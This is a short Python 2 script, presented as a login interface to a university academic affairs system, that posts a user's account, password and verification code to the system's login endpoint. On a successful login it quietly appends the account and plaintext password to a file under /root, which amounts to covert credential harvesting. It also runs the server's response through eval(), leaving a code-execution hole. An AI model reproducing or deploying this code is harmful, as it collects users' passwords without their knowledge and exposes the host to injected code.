# -*- coding: utf-8 -*-  
import urllib2
import cookielib
import urllib
import re
import sys
# 教务系统接口
def get(A,B,C):
	cookie = cookielib.CookieJar()    
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))  
	#需要POST的数据#  
	postdata=urllib.urlencode({    
		'account':A,    
		'pwd':B ,  
		'verifycode' :C,
	})    
	#自定义一个请求#  
	req = urllib2.Request(    
		url = 'http://222.200.98.147/login!doLogin.action',    
		data = postdata  
	)  
	#访问该链接#  
	result = opener.open(req)  
	# print cookie
	# result2 = opener.open("http://222.200.98.147/login!welcome.action")
	#打印返回的内容#  
	# for it in cookie:
		# it = it.value
	# print result.read().decode('utf-8')
	# print result.read()
	res=result.read()
	res=eval(res)
	result.close()
	if('y'==res['status']):
		f = open('/root/data.txt','a+')  
		f.writelines("account:"+A) 
		f.writelines("   ") 
		f.writelines("pwd:"+B) 	
		f.write('\n')	 		
		f.close() 
	# print res['status']
	return res['status']